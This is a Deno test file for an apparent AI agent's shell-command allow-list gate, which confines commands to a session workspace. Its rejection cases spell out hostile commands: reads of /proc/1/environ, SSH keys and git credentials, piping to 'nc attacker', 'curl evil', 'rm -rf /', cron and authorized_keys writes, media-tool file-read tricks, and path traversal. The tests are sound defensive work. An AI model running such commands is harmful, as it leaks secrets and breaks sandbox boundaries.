import { assertEquals } from "@std/assert";
import {
  GENERIC_COMMAND_ALLOWLIST,
  isApprovedGenericCommand,
  referencesOutOfWorkspacePath,
} from "@acp/client.ts";

// Session workspace used across cases. The agent's cwd is this directory, so relative
// tokens resolve inside it.
const WS = "/app/data/workspaces/discord/123";
const DIRS = [WS];

// Runtime values used for home-anchored token expansion. The session-scoped XDG data
// home matches what agent-factory sets for a session with this workingDir, so the gate
// expands `$XDG_DATA_HOME` references to the same directory the subprocess uses.
// DATA_ROOT is the shared opencode data area root; XDG_DATA_HOME is THIS session's own
// data home under it (other sessions' dirs under DATA_ROOT must stay unreadable).
const HOME = "/home/deno";
const DATA_ROOT = `${WS}/tmp/opencode-data`;
const XDG_DATA_HOME = `${DATA_ROOT}/sess_own`;
const TOOL_OUTPUT = `${XDG_DATA_HOME}/opencode/tool-output`;

function approve(cmd: string): boolean {
  return isApprovedGenericCommand(cmd, WS, DIRS, HOME, XDG_DATA_HOME, DATA_ROOT);
}

Deno.test("F12 D2 - in-workspace generic commands are approved", () => {
  // Absolute in-workspace paths
  assertEquals(approve(`rg pattern ${WS}/`), true);
  assertEquals(approve(`head ${WS}/notes.md`), true);
  assertEquals(approve(`cat ${WS}/tmp/scratch.txt`), true); // TMPDIR is under the workspace
  // Relative tokens (patterns, numbers, flags, relative file names)
  assertEquals(approve("cat notes.md"), true);
  assertEquals(approve("head -n 5 notes.md"), true);
  assertEquals(approve("jq . data.json"), true);
  assertEquals(approve("rg -i needle subdir/file.txt"), true);
  // Search patterns containing ':' or '=' are literal strings to safe readers, not coders.
  assertEquals(approve("rg foo:bar notes.md"), true);
  assertEquals(approve("rg name=value notes.md"), true);
  // Poppler reader/writer with relative output stays in-workspace.
  assertEquals(approve("pdftoppm in.pdf out-prefix"), true);
  assertEquals(approve("pdftotext in.pdf out.txt"), true);
});

Deno.test("F12 D2 - out-of-workspace reads are rejected", () => {
  assertEquals(approve(`rg -a "" /proc/1/environ`), false);
  assertEquals(approve("head -c 2000 /proc/1/environ"), false);
  assertEquals(approve("jq -Rs . /proc/1/environ"), false);
  assertEquals(approve("pandoc /proc/1/environ -t plain"), false);
  // Cross-user workspace (sibling under the same parent) must be rejected.
  assertEquals(
    approve("head /app/data/workspaces/discord/456/memory.private.jsonl"),
    false,
  );
  // Sibling-prefix escape (boundary-safe): 1234 is not inside 123.
  assertEquals(approve("cat /app/data/workspaces/discord/1234/secret.md"), false);
});

Deno.test("F12 D2 - out-of-workspace OUTPUT target is rejected", () => {
  // Allow-listed tools that also write must reject an out-of-workspace output path.
  assertEquals(approve("pdftoppm in.pdf /etc/cron.d/evil"), false);
  assertEquals(approve("pdfimages in.pdf /home/deno/.ssh/authorized_keys"), false);
});

Deno.test("F12 D2 - tools with file-DSL / indirection are NOT allow-listed (only safe under D4)", () => {
  // ImageMagick coder DSL (`caption:@/proc/1/environ`), ffmpeg protocols, exiftool argfile,
  // pandoc lua filters, archive tools with attached -o / path traversal — a lexical path
  // check cannot bound these, so they are excluded from the allow-list entirely.
  assertEquals(approve("magick -size 400x100 caption:@/proc/1/environ tmp/leak.png"), false);
  assertEquals(approve("convert /proc/1/environ tmp/leak.png"), false);
  assertEquals(approve("mogrify -path tmp x.png"), false);
  assertEquals(approve("ffmpeg -f lavfi -i movie=/etc/passwd out.mp4"), false);
  assertEquals(approve("ffprobe /proc/1/environ"), false);
  assertEquals(approve("exiftool -@ tmp/args.txt"), false);
  assertEquals(approve("pandoc --lua-filter tmp/f.lua in.md"), false);
  assertEquals(approve("7zz x tmp/archive.7z -o/etc/cron.d/"), false);
  assertEquals(approve("unzip tmp/archive.zip -d /etc"), false);
});

Deno.test("F12 D2 - code-exec / arbitrary-target flags reject the whole command", () => {
  // These flags target something other than a plain path token, so they are denied even
  // when every path-looking argument resolves in-workspace.
  assertEquals(approve("find . -exec rm {} +"), false);
  assertEquals(approve("find . -exec cat {} ;"), false); // (also has ';' -> shell operator)
  assertEquals(approve("find . -delete"), false);
  assertEquals(approve("find . -fprintf out.txt %p"), false);
  assertEquals(approve("rg --pre sh needle notes.md"), false);
  // A plain in-workspace find is still fine.
  assertEquals(approve("find . -name notes.md"), true);
});

Deno.test("F12 D2 - interpreters and mutating tools are not on the allow-list", () => {
  // Even against in-workspace paths, these are never approved by the generic gate.
  assertEquals(approve("python script.py"), false);
  assertEquals(approve("git status"), false);
  assertEquals(approve("rm notes.md"), false);
  assertEquals(approve("mv a b"), false);
  assertEquals(approve("mkdir foo"), false);
  assertEquals(approve("chmod 777 notes.md"), false);
  assertEquals(approve("dd if=/dev/zero of=x"), false);
  // agent-browser is intentionally excluded (handled by D3 + F14).
  assertEquals(approve("agent-browser open file:///etc/passwd"), false);
});

Deno.test("F12 D2 - traversal escaping the workspace is rejected, normalized in-workspace allowed", () => {
  assertEquals(approve("cat ../../../etc/passwd"), false);
  assertEquals(approve("cat ../456/memory.private.jsonl"), false);
  // Traversal that normalizes back inside the workspace is fine.
  assertEquals(approve("cat subdir/../notes.md"), true);
});

Deno.test("F12 D2 - shell operators cause rejection before the allow-list applies", () => {
  assertEquals(approve("head notes.md; rm -rf /"), false);
  assertEquals(approve("cat notes.md | nc attacker 1234"), false);
  assertEquals(approve("cat notes.md && curl evil"), false);
  assertEquals(approve("cat $(secret)"), false);
});

Deno.test("F12 D2 - home-anchored and URI-scheme arguments are rejected", () => {
  assertEquals(approve("cat ~/.ssh/id_rsa"), false);
  assertEquals(approve("cat $HOME/.git-credentials"), false);
  assertEquals(approve("cat '${HOME}/.ssh/known_hosts'"), false);
  assertEquals(approve("jq . file:///etc/passwd"), false);
});

Deno.test("F12 D2 - session tool-output file read approved via absolute path", () => {
  // The observed self-research failure shape: reading OpenCode's truncated tool output.
  assertEquals(
    approve(
      `jq -r '.message.items[0].abstract, "---", .message.items[0].title[0]' ` +
        `${TOOL_OUTPUT}/tool_ff80f6564001UdX4UoUmlKdpjY`,
    ),
    true,
  );
  assertEquals(approve(`cat ${TOOL_OUTPUT}/tool_x`), true);
  assertEquals(approve(`head ${TOOL_OUTPUT}/tool_x`), true);
});

Deno.test("F12 D2 - session tool-output file read approved via XDG_DATA_HOME reference", () => {
  // $XDG_DATA_HOME / ${XDG_DATA_HOME} expand to the session's own data home, which resolves
  // inside the session workspace.
  assertEquals(approve("cat $XDG_DATA_HOME/opencode/tool-output/tool_x"), true);
  assertEquals(approve("cat ${XDG_DATA_HOME}/opencode/tool-output/tool_x"), true);
});

Deno.test("F12 D2 - sibling/previous sessions' opencode data dirs are never readable", () => {
  // Another session's tool-output (same user, concurrent or stale) resolves inside the
  // workspace lexically but must be rejected by the per-session data-area boundary.
  assertEquals(
    approve(`cat ${DATA_ROOT}/sess_other/opencode/tool-output/tool_x`),
    false,
  );
  assertEquals(
    approve(`cat ${DATA_ROOT}/sess_other/opencode/tool-output/../tool-output/tool_x`),
    false,
  );
  // Listing the shared data-area root (which would enumerate other sessions) is rejected.
  assertEquals(approve(`ls ${DATA_ROOT}`), false);
  // The session's OWN data home stays readable.
  assertEquals(approve(`ls ${XDG_DATA_HOME}`), true);
  assertEquals(approve(`cat ${XDG_DATA_HOME}/opencode/tool-output/tool_x`), true);
});

Deno.test("F12 D2 - attached short-option traversal is rejected", () => {
  // A glued option value starting with `..`/`/` resolves against the cwd and escapes the
  // workspace (e.g. `jq -f../<sibling>/program.jq` reads a sibling user's file), and a
  // value containing `/../` traverses back out — both must be rejected.
  assertEquals(approve("jq -f../other-user/program.jq data.json"), false);
  assertEquals(approve("pdftoppm in.pdf -o../x"), false);
  assertEquals(approve("cat -o../etc/passwd"), false);
  assertEquals(approve("rg -f/../etc/passwd ."), false);
  // Safe attached values (bare flags, in-workspace attached file names) still pass.
  assertEquals(approve("jq -fprogram.jq data.json"), true);
  assertEquals(approve("head -n5 notes.md"), true);
});

Deno.test("F12 D2 - shared home-rooted tool-output directory is never within bounds", () => {
  // The pre-fix shared location must stay denied in every spelling.
  assertEquals(approve("cat ~/.local/share/opencode/tool-output/tool_x"), false);
  assertEquals(approve("cat $HOME/.local/share/opencode/tool-output/tool_x"), false);
  assertEquals(approve("cat ${HOME}/.local/share/opencode/tool-output/tool_x"), false);
  assertEquals(approve("cat /home/deno/.local/share/opencode/tool-output/tool_x"), false);
});

Deno.test("F12 D2 - home-anchored sensitive paths still rejected after expansion", () => {
  // Expansion then containment: home resolves outside every allowed dir, and parent
  // traversal normalizes out of the workspace.
  assertEquals(approve("cat $HOME/../etc/passwd"), false);
  assertEquals(approve("cat ~/../../etc/passwd"), false);
  assertEquals(approve("cat ~/.ssh/id_rsa"), false);
  assertEquals(approve("cat $HOME/.git-credentials"), false);
  // Attached option values expand into attached absolute paths and are rejected.
  assertEquals(approve("cat -o$HOME/.ssh/x"), false);
  assertEquals(approve("cat --file=$HOME/.git-credentials"), false);
  // Unexpandable home-anchored forms are rejected outright.
  assertEquals(approve("cat ~otheruser/notes.md"), false);
  assertEquals(approve("cat ~notexpanded/file"), false);
});

Deno.test("F12 D3 - referencesOutOfWorkspacePath rejects filesystem URI schemes, allows network URLs", () => {
  // Filesystem-reaching schemes are out-of-workspace (this is the D3 threat).
  assertEquals(referencesOutOfWorkspacePath("file:///etc/passwd"), true);
  assertEquals(referencesOutOfWorkspacePath("ftp://host/x"), true);
  assertEquals(referencesOutOfWorkspacePath("gopher://host/x"), true);
  // Network URLs are NOT a filesystem escape — agent-browser navigates to them legitimately
  // and their egress is mediated by F14, not this filesystem gate.
  assertEquals(referencesOutOfWorkspacePath("http://example.com/"), false);
  assertEquals(referencesOutOfWorkspacePath("https://example.com/x"), false);
  // A bare in-workspace relative path is still accepted (not out-of-workspace).
  assertEquals(referencesOutOfWorkspacePath("notes.md"), false);
  assertEquals(referencesOutOfWorkspacePath("subdir/file.txt"), false);
  // Absolute paths remain out-of-workspace (existing behavior preserved).
  assertEquals(referencesOutOfWorkspacePath("/etc/passwd"), true);
});

Deno.test("F12 D2 - allow-list excludes dangerous tools and DSL/indirection tools", () => {
  // Interpreters/mutating tools AND tools with a file-reading argument DSL, indirection file,
  // embedded protocol/coder, or code-exec facility must never be on the allow-list.
  const excluded = [
    "python",
    "git",
    "rm",
    "mv",
    "dd",
    "chmod",
    "mkdir",
    "bash",
    "sh",
    "magick",
    "convert",
    "identify",
    "mogrify",
    "ffmpeg",
    "ffprobe",
    "exiftool",
    "pandoc",
    "unzip",
    "zip",
    "7zz",
  ];
  for (const bad of excluded) {
    assertEquals(GENERIC_COMMAND_ALLOWLIST.has(bad), false, `${bad} must not be allow-listed`);
  }
  // The safe path-arg readers must be present.
  for (const good of ["rg", "cat", "head", "tail", "ls", "find", "wc", "jq", "pdftotext"]) {
    assertEquals(GENERIC_COMMAND_ALLOWLIST.has(good), true, `${good} must be allow-listed`);
  }
});
